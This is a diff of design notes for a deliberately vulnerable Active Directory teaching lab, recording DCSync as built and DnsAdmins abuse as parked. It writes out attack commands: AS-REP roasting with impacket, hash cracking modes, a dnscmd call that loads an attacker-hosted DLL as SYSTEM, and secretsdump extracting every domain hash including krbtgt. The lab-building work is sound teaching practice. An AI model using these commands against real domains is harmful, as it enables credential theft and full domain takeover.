@@ -6,7 +6,7 @@ Phase 1 is complete on the Windows Server 2019 domain controller `uow-csf-dc` at
 
 Everything in this document was executed manually by the project owner and verified from real command output. Nothing was run by an assistant, and no verification claim here is inferred rather than observed.
 
-Phase 2, the deliberate vulnerability layer, is partially built. Kerberoasting (`svc-web`) and AS-REP roasting (`helpdesk01`) have been built and validated on the master DC, see `e-18`/`e-19`. The `DnsAdmins`-abuse and DCSync techniques in Section 10 remain design-only, written against accounts and rights that do not exist yet, and are not validated.
+Phase 2, the deliberate vulnerability layer, is now substantially built. Kerberoasting (`svc-web`), AS-REP roasting (`helpdesk01`), and DCSync domain replication rights abuse (`backup.operator`) have all been built and validated on the master DC, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone. The `DnsAdmins`-abuse technique in Section 10 remains parked at the design/testing stage: reconnaissance is workable, but no clean Kali-native student exploitation path has been validated.
 
 This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That document is background only and is not authoritative where it conflicts with the decisions below, in particular its Server Core and WordPress conclusions, which are not current.
 
@@ -16,7 +16,7 @@ This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That docum
 - Snapshot at that point: `cav-csf-windows-01-clean-server2019-vmtools` (Windows Server 2019 + VMware Tools only).
 - Static IP, hostname rename, AD DS/DNS roles and domain promotion: all done and validated, see the next section.
 - OU, user and group scaffolding: built, matching section 3 exactly.
-- Deliberate vulnerabilities: partially built. Kerberoasting on `svc-web` and AS-REP roasting on `helpdesk01` are built and validated, see `e-18`/`e-19`; `DnsAdmins` abuse and DCSync are not started. Website component: not started (section 5).
+- Deliberate vulnerabilities: substantially built. Kerberoasting on `svc-web`, AS-REP roasting on `helpdesk01`, and DCSync domain replication rights abuse on `backup.operator` are built and validated, see `e-18`/`e-19`/`r-21`/`e-21`, with DCSync as the Windows Phase 2 capstone; `DnsAdmins` abuse remains parked at the design/testing stage. Website component: not started (section 5).
 - Master reproduction at `192.168.144.200` is complete; sections 7 to 9 are retained as the completed build sequence and validation record.
 
 ## Phase 1 AD DS/DNS baseline: passed
@@ -285,7 +285,7 @@ nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV 192.168.144.200
 
 ## 10. Reproducible exploit/walkthrough instructions for later phases
 
-This section records both completed and still-planned Phase 2 techniques. Kerberoasting and AS-REP roasting have now been built and validated against the master DC, see `e-18` and `e-19`. The remaining techniques in this section, including `DnsAdmins` abuse and DCSync, are design proposals only and cannot be run until the corresponding Phase 2 scenario is actually built. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.
+This section records both completed and still-planned Phase 2 techniques. Kerberoasting, AS-REP roasting, and DCSync domain replication rights abuse have now been built and validated against the master DC, see `e-18`, `e-19`, and `r-21`/`e-21`. `DnsAdmins` abuse remains parked at the design/testing stage: the reconnaissance half (identifying group membership) is workable, but no clean Kali-native student exploitation path has been validated, so it is not yet built as a Phase 2 scenario. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.
 
 **Kerberoasting** — built and validated against `svc-web` (registered SPN, crackable password), see `e-18`. The commands below are retained as the general technique reference:
 
@@ -301,21 +301,21 @@ impacket-GetNPUsers uow-csf.internal/ -usersfile <userlist> -dc-ip 192.168.144.2
 ```
 Expect a `$krb5asrep$` hash for any account with pre-auth disabled, cracked with `hashcat -m 18200`.
 
-**DnsAdmins abuse** — not yet built or validated; requires a Phase 2 account placed in the `DnsAdmins` group, from that account:
+**DnsAdmins abuse** — parked at the design/testing stage; a Phase 2 account placed in the `DnsAdmins` group can be identified via reconnaissance (an authenticated LDAP query for the group's membership, tested successfully), but no clean Kali-native student exploitation path has been validated. The intended technique, from that account:
 
 ```cmd
 dnscmd uow-csf-dc /config /serverlevelplugindll \\<attacker-share>\<malicious.dll>
 ```
-followed by restarting the DNS service to load the DLL as SYSTEM. This has real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), so it needs explicit scoping before being added to Phase 2, see section 12.
+followed by restarting the DNS service to load the DLL as SYSTEM, ran into two practical blockers during testing: a RemoteRegistry-based route (`impacket-reg`) was denied, and the Windows-client route depends on `dnscmd`/RSAT tooling not present by default. This also carries real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), so it needs explicit scoping in addition to a working student path before being added to Phase 2, see section 12.
 
-**DCSync** — not yet built or validated; requires a Phase 2 account granted replication rights it should not hold, from that account:
+**DCSync** — built and validated against `backup.operator`, granted `DS-Replication-Get-Changes`/`DS-Replication-Get-Changes-All` directly on the domain object with no corresponding administrative group membership, see `r-21`/`e-21`. Reconnaissance uses `bloodhound-python`'s LDAP-based collection (parsed directly from its JSON output, no GUI required); the credential is confirmed via a routine `nxc` wordlist spray; exploitation:
 
 ```bash
-impacket-secretsdump uow-csf.internal/<account>:<password>@192.168.144.200
+impacket-secretsdump uow-csf.internal/backup.operator@192.168.144.200
 ```
-Expect NTLM hash dumps for domain accounts including `krbtgt`, confirming full domain compromise.
+NTLM hashes and Kerberos keys recovered for every domain account including `krbtgt`, confirming full domain compromise. This is the Windows Phase 2 capstone.
 
-Each of these needs its own numbered write-up, following the existing `.md` documentation structure (Summary, Lab Dependencies, Reconnaissance, Exploitation, Evidence, Outcome, Remediation, Teaching Notes), once actually validated against the built DC.
+DCSync's write-up now exists (`r-21`/`e-21`), following the existing `.md` documentation structure (Summary, Lab Dependencies, Reconnaissance, Exploitation, Evidence, Outcome, Remediation, Teaching Notes). `DnsAdmins` still needs its own numbered write-up once a clean, validated student exploitation path exists.
 
 ## 11. What to defer until the vulnerability phase
 
@@ -343,4 +343,4 @@ Each of these needs its own numbered write-up, following the existing `.md` docu
 - **Snapshot/versioning naming.** Still unreconciled, but now retrospectively: the clean-install snapshot was already taken as `cav-csf-windows-01-clean-server2019-vmtools`, which does not match the Linux convention (`CAV-CSF-01-VMware-Clean`). Decide whether to align the two conventions and rename, or accept the divergence and document it, before further Windows snapshots accumulate under the current style.
 - **DNS authority for `uow-csf.internal`.** Settled, recorded here only so it is not reopened. The Linux VM's BIND9 instance and this DC's AD-integrated zone both hold the zone; this is accepted as a deliberate split, validated by testing the web applications with this VM powered off. The Linux VM is optimised for standalone operation because that is how it is used in all but two modules. See `ad-integration.md`.
 - **Time source.** Should Kali and the Linux VM share an NTP source with the DC? Relevant once cross-machine Kerberos activities (section 10) are added, where clock skew can silently break exploitation attempts.
-- **DnsAdmins scope.** Given the SYSTEM-level blast radius of the DnsAdmins path on a shared lab network, confirm whether it is in scope for Phase 2 at all, or kept as optional advanced material alongside DCSync.
+- **DnsAdmins scope.** DCSync is now built and validated as the Windows Phase 2 capstone (`r-21`/`e-21`), resolving that half of this open item. `DnsAdmins` itself remains parked: given its SYSTEM-level blast radius on a shared lab network and the lack of a validated Kali-native student exploitation path (reconnaissance alone is workable), confirm whether it stays in scope for Phase 2 as optional advanced material, or is dropped.
